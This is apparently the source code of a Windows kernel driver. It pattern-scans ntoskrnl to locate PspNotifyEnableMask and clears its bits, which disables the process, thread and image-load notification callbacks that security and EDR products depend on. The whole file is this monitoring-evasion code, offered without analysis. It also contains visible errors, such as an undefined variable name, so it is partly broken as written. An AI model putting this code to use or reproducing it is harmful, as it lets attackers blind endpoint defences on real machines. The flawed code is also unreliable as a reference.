#include <ntddk.h>

#define POOL_SIZE 1024*1024
#define POOL_TAG 0x6B65726E656C

struct NtosInfo
{
    PVOID ImageBase;
    ULONG64 ImageSize;
};

union _PspNotifyEnableMaskBits
{
    UINT64 All;

    struct
    {
        UINT64 LoadImage : 1;
        UINT64 CreateProcess : 2;
        UINT64 CreateThread : 2;
    }Bits;
};

typedef struct _SYSTEM_MODULE_ENTRY
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
    ULONG Count;
    SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemModuleInformation = 11,
} SYSTEM_INFORMATION_CLASS;

bool LocatePspNotifyEnableMask(
    VOID
);

template <typename ExportType>
ExportType GetKernelExport(
    PCWSTR zExportName
);

typedef NTSTATUS(NTAPI* _ZwQuerySystemInformation)
(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);


NTSTATUS DriverEntry(
   PDRIVER_OBJECT DriverObject,
   PUNICODE_STRING RegistryPath
);

VOID Unload(
    PDRIVER_OBJECT DriverObject
);

template <typename T>
bool GetAddress(
	UINT64 Base, 
	UINT64 Size, 
	PCUCHAR Pattern, 
	PCSTR WildCard, 
	INT OpcodeBytes, 
	INT AddressBytes, 
    T& Found
);

NTSTATUS GetSysModInfo(
  PSYSTEM_MODULE_INFORMATION& SystemModInfo
);

PUINT32 PspNotifyEnableMask;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = Unload;

    _PspNotifyEnableMaskBits PspNotifyEnableMaskBits;
        
    LocatePspNotifyEnableMask();

    PspNotifyEnableMaskBits.All = *PspNotifyEnableMask;

    DbgPrint("Found PspNotifyEnableMask at %p\n", PspNotifyEnableMask);

    DbgPrint("PspNotifyEnableMask Original Value %d\n", *PspNotifyEnableMask);

    PspNotifyEnableMaskBits.Bits = { 0,0,0 };

    *PspNotifyEnableMask = PspNotifyEnableMaskBits.All;

    DbgPrint("PspNotifyEnableMask Modfied Value %d\n", *PspNotifyEnableMask);

    return STATUS_SUCCESS;
}

VOID Unload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    DbgPrint("Driver Unloaded ...");
}

bool LocatePspNotifyEnableMask()
{
    PSYSTEM_MODULE_INFORMATION SystemModInfo = nullptr;

    PVOID PspNotifyEnableMaskInstrAddr = nullptr;

    UCHAR PspNotifyEnableMaskPattern[] = "\x8B\x05\x00\x00\x00\x00\xA8\x02\x75\xC8";
    
    if (!NT_SUCCESS(GetSysModInfo(SystemModInfo)))
    {
        DbgPrint("Failed to get system module information");
        return false;
    }

    NtosInfo ntos = { SystemModInfo->Module[0].ImageBase, SystemModInfo->Module[0].ImageSize };

   if (!GetAddress((UINT64)ntos.ImageBase, ntos.ImageSize, PspNotifyEnableMaskPattern, "xx????xxxx", 2, 4, pPspNotifyEnableMask))
    {
        DbgPrint("Failed to get PspNotifyEnableMask");
        return false; 
    }

    return true;
}

template <typename T>
bool GetAddress(UINT64 Base, UINT64 Size, PCUCHAR Pattern, PCSTR WildCard, INT OpcodeBytes, INT AddressBytes, T& Found)
{
    auto CheckMask = [&](PCUCHAR Data, PCUCHAR Pattern, PCSTR WildCard)
    {
        for (; *WildCard; ++WildCard, ++Data, ++Pattern)
        {
            if (*WildCard == 'x' && *Data != *Pattern)
            {
                return false;
            }
        }

        return *WildCard == 0;
    };

    auto Resolve = [&](PVOID InstructionAddress, INT OpcodeBytes, INT AddressBytes, T& Found)
    {
        ULONG64 InstructionAddr = (ULONG64)InstructionAddress;

        AddressBytes += OpcodeBytes;

        ULONG32 RelativeOffset = *(ULONG32*)(InstructionAddr + OpcodeBytes);

        Found = (T)(InstructionAddr + RelativeOffset + AddressBytes);
    };


     for (auto i = 0; i < Size; i++)
     {
         if (CheckMask((PUCHAR)(Base + i), Pattern, WildCard))
         {
             PVOID InstrAddress = (PVOID)(Base + i);

             Resolve(InstrAddress, OpcodeBytes, AddressBytes, Found);

             return true;
         }
     }

     return false;
}

template <typename ExportType>
ExportType GetKernelExport(PCWSTR zExportName)
{
    UNICODE_STRING UExportName;

    RtlInitUnicodeString(&UExportName, zExportName);

    ExportType ExportAddress = (ExportType)MmGetSystemRoutineAddress(&UExportName);

    return ExportAddress ? ExportAddress : ExportType(nullptr);
}

NTSTATUS GetSysModInfo(PSYSTEM_MODULE_INFORMATION& SystemModInfo)
{
    auto ZwQuerySystemInformation = GetKernelExport<_ZwQuerySystemInformation>(L"ZwQuerySystemInformation");

    SystemModInfo = (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolZero(NonPagedPool, POOL_SIZE, POOL_TAG);

    if (SystemModInfo)
    {
        NTSTATUS Status = ZwQuerySystemInformation(SystemModuleInformation, SystemModInfo, POOL_SIZE, nullptr);

        if (NT_SUCCESS(Status))
        {
            return STATUS_SUCCESS;
        }
    }

    ExFreePoolWithTag(SystemModInfo, POOL_TAG);
    return STATUS_UNSUCCESSFUL;
}
